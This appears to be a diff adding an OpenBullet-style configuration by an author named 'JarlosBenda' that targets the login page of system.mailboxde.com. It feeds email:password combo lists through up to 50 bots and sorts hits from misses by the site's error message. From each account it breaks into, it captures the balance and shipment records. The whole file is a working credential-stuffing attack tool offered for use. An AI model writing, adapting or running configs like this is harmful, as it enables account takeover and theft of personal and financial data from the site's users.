@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "mailboxde",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-27T21:25:14.4578544-07:00",
+  "AdditionalInfo": "Captures balance, shipments and shipment history.",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "JarlosBenda",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://system.mailboxde.com/index.php" 
+  CONTENT "loginjs=1&kontrola=2019-04-27+20%3A45%3A41&kontrolahash=e7a7b6a2a54e4dd18ab0e765cab7bb8e&email=<USER>&heslo=<PASS>&pass=&login=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://system.mailboxde.com" 
+  HEADER "Referer: https://system.mailboxde.com/login.html" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Invalid e-mail/password combination." 
+  KEYCHAIN Failure OR 
+    KEY "<span style=\"margin-left:10px;color:maroon;font-weight:bold;\">Invalid e-mail/password combination.</span>" 
+    KEY "Invalid e-mail/password combination." 
+
+PARSE "<SOURCE>" LR "<br />" "(" -> CAP "Balance:" 
+
+PARSE "<SOURCE>" LR "<li><a href=\"/prikazce_potvrdit_nakladku_box.php\">" "</a>" -> CAP "" 
+
+PARSE "<SOURCE>" LR "<li><a href=\"/prikazce_zahajene_prepravy_box.php\">" "</a>" -> CAP "2" 
+
+PARSE "<SOURCE>" LR "<li><a href=\"/prikazce_prepraveno_zaplatit_box.php\">" "</a>" -> CAP "3" 
+
